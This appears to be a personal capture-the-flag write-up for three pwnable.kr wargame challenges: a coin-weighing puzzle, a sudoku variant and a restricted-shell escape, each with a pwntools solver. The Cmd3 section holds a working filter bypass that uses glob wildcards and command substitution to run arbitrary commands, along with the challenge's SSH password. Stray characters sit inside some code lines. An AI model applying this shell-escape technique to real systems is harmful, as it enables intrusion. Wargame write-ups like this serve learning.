### Here I will publish only the challenges I found easy, since I don't want everyone to get easy points :)

## Coin2 - Level 5
```
	---------------------------------------------------
	-              Shall we play a game?              -
	---------------------------------------------------
	
	You have given some gold coins in your hand.
	however, there is one counterfeit coin among them
	counterfeit coin looks exactly same as real coin
	luckily, its weight is different from real one
	real coin weighs 10, counterfeit coin weighes 9
	help me to find the counterfeit coin with a scale.
	if you find 100 counterfeit coins, you will get reward :)
	FYI, you have 60 seconds.

	- How to play - 
	1. you get a number of coins (N) and number of chances (C) to use scale
	2. then you specify C set of index numbers of coins to be weighed
	3. you get the weight information of each C set
	4. you give the answer
	
	- Example -
	[Server] N=4 C=2 	# find counterfeit among 4 coins with 2 trial
	[Client] 0 1-1 2	# weigh two set of coins (first and second), (second and third)
	[Server] 20-20		# scale result : 20 for first set, 20 for second set
	[Client] 3 		# counterfeit coin is fourth!
	[Server] Correct!

	- Note - 
	dash(-) is used as a seperator for each set

	- Ready? starting in 3 sec ... -
```

This challenge is really similar to coin1, but now we can't use the previous scale result.
One important thing to notice is that 2^C <= N.
This is important because this allows us to separate the scales into `C` different groups, 
where the i'th group contains all the numbers which have their i'th bit on.
This way, the server will give us `C` weights, where the i'th weight is divisible by 10 if and only if
the i'th bit is on in the targeted number.
this way we can go thorugh each group (we'll call it the i'th group)
and if the weight isn't divisible by 10 we know that the i'th bit is on , so we add 2*i to the number.
At the end, we send this number.
(In order to run it faster I ran my exploit inside the pwnable server)

Exploit:
```py
from pwn import *
import time

def is_set(x, n):
    return x & 2 ** n != 0 

p = remote("localhost" ,9008)
print(p.recv().decode())
time.sleep(3)ע
for k in range(100):
	N, C = [int(i.split("=")[1]) for i in p.recv().decode().split(" ")]

	groups = []


	for i in range(C): # create c groups where the i'th group has all the numbers with the i'th bit on
		new_group = []
		for j in range(N):
			if is_set(j, i):
				new_group.append(j)
		groups.append(new_group)

	payload = ""

	for group in groups:
		payload += " ".join([ str(i) for i in group]) + "-"
        
	p.sendline(payload[:-1])
	results = [int(i) for i in p.recv().decode().split("-")]
	num = 0
	for i in range(len(results)):
		if results[i] % 10 != 0:
			num += (2 ** i)

	p.sendline(str(num))
	print(p.recv())

print(p.recv())

```


## Sudoku - Level 8

We need to solve 100 soduko boards with a twist.

I grabbed the first sudoku solver online, and added the new rules.
This is the code I have created:
ע
```py
from pwn import *

M = 9


def doesBypassAdditionalRule(grid, smaller, comp, points):
    sum = 0
    for point in points:
        sum += grid[point[0] - 1][point[1] - 1]
    if smaller:
        return sum < comp
    return sum > comp


def solve(grid, row, col, num, smaller, comp, points):
    for x in range(9):
        if grid[row][x] == num:
            return False
    for x in range(9):
        if grid[x][col] == num:
            return False

    startRow = row - row % 3
    startCol = col - col % 3
    for i in range(3):
        for j in range(3):
            if grid[i + startRow][j + startCol] == num:
                return False
    return True


def Suduko(grid, row, col, smaller, comp, points):
ע
    if (row == M - 1 and col == M):
        return True
    if col == M:
        row += 1
        col = 0
    if grid[row][col] > 0:
        return Suduko(grid, row, col + 1, smaller, comp, points) and doesBypassAdditionalRule(grid, smaller, comp, points)
    for num in range(1, M + 1, 1):

        if solve(grid, row, col, num, smaller, comp, points):

            grid[row][col] = num
            if Suduko(grid, row, col + 1, smaller, comp, points) and doesBypassAdditionalRule(grid, smaller, comp, points):
                return True
        grid[row][col] = 0
    return False


def recvAll(s):
    while True:
        try:
            line = s.recvline(timeout=1).decode()
            if line == '':
                return
            print(line)
        except:
            return


'''0 means the cells where no value is assigned'''
grid = []

server = remote('pwnable.kr',  9016)
# starting the game
recvAll(server)
server.sendline(b"")
recvAll(server)
server.sendline(b"")

for i in range(100):
    print("Iteration num", i)
    grid = []
    server.recvline()
    server.recvline()

    for i in range(9):
        line = server.recvline().decode()
        new_row = []
        for i in line:
            if i.isdigit():
                new_row.append(int(i))
        grid.append(new_row)

    server.recvline()
    server.recvline()
    rule = server.recvline().decode()
    smaller = "smaller" in rule
    comp = int(rule.split(" ")[-1])

    points = []
    l = ""
    while "solution" not in l:
        l = server.recvline().decode()
        p = l.split(" ")[-1]
        if "," not in p:
            breakע
        new_p = [int(p[1]), int(p[3])]
        points.append(new_p)

    Suduko(grid, 0, 0, smaller, comp, points)  # solving sudoku

    server.sendline(str(grid))

recvAll(server)
```

## Cmd3 - Level 10
```py
	#!/usr/bin/python
import base64, random, math
import os, sys, time, string
from threading import Timer

def rstring(N):
	return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))

password = rstring(32)
filename = rstring(32)

TIME = 60
class MyTimer():
	global filename
        timer=None
        def __init__(self):
                self.timer = Timer(TIME, self.dispatch, args=[])
                self.timer.start()
        def dispatch(self):
                print 'time expired! bye!'
		sys.stdout.flush()
		os.system('rm flagbox/'+filename)
                os._exit(0)

def filter(cmd):
	blacklist = '` !&|"\'*'
	for c in cmd:
		if ord(c)>0x7f or ord(c)<0x20: return False
		if c.isalnum(): return False
		if c in blacklist: return False
	return True

if __name__ == '__main__':
	MyTimer()
	print 'your password is in flagbox/{0}'.format(filename)
	os.system("ls -al")
	os.system("ls -al jail")
	open('flagbox/'+filename, 'w').write(password)
	try:
		while True:
			sys.stdout.write('cmd3$ ')
			sys.stdout.flush()
			cmd = raw_input()
			if cmd==password:
				os.system('./flagbox/print_flag')
				raise 1
			if filter(cmd) is False:
				print 'caught by filter!'
				sys.stdout.flush()
				raise 1

			os.system('echo "{0}" | base64 -d - | env -i PATH=jail /bin/rbash'.format(cmd.encode('base64')))
			sys.stdout.flush()
	except:
		os.system('rm flagbox/'+filename)
		os._exit(0)
```

This challenge is a really stupid one, and it doesn't require any special BE skills to be exploited.
The idea here is that we are given some kind of shell, which is REALLY defended.
we can't write any alphanumeric characters, we can't type special characters, and we can't type non-ascii characters.
We are given the name of some file, and if we enter its content, we will be given the flag.
The idea here is to use bash wildcards (specificlly the `?`, which serves as a single-character wild card for filename expansion in globbing)
We can use this if we type `/???/`, and this way we can do things with the tmp directory.
So my idea was to create a file which its name passes the filter (I've used `..__`).
Another thing to notice is that we can run any command with the `$()` command substition.
Together with the `<` input redirection symbol, we can read our created file and execute any command we want!

Exploit:
```py
from pwn import *

s = ssh(port=2222,user="cmd3",host="pwnable.kr",password="FuN_w1th_5h3ll_v4riabl3s_haha")


p = remote("pwnable.kr",  9023)

p.recvuntil("your password is in ")

passcodeFile = p.recvline().rstrip().decode()

s.run('touch /tmp/..__; echo "cat {0}" > /tmp/..__'.format(passcodeFile))

print(p.recvuntil("cmd3$ "))

p.sendline("$(</???/..__)")

tmp = p.recv().decode()

p.sendline(tmp)

print(p.recvall().decode())
```
